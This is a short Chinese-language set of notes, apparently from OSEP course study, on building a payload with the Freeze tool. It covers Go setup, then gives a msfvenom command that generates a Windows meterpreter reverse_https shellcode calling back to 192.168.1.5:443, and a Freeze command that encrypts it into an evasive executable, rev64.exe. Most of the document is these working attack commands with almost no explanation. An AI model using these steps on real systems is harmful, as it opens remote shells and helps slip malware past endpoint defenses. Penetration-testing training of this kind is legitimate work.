# 工具地址

```
https://github.com/optiv/Freeze
```


# 注意

1. go版本最好是1.19.x，不然会有坑

```
┌──(root㉿kali)-[~/osep/Freeze]
└─# go version                       
go version go1.19.8 linux/amd64

```

2. 手动下载几个包

指定go源
```
# 1. 七牛 CDN
go env -w  GOPROXY=https://goproxy.cn,direct

# 2. 阿里云
go env -w GOPROXY=https://mirrors.aliyun.com/goproxy/,direct

# 3. 官方
go env -w  GOPROXY=https://goproxy.io,direct

```

缺啥补啥，国内源可能有坑
```
go build golang.org/x/sys/windows
```

3. 生成payload

payload
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.5 LPORT=443 -f raw -o rev64.bin
```

加密
```
./Freeze -I /root/osep/rev64.bin -O rev64.exe -encrypt 
```

同文件夹生成一个rev64.exe
```
┌──(root㉿kali)-[/opt/Freeze]
└─# ls
Freeze  Freeze.go  go.mod  go.sum  LICENSE  Loader  README.md  rev64.exe  Screenshots  Struct  Utils

```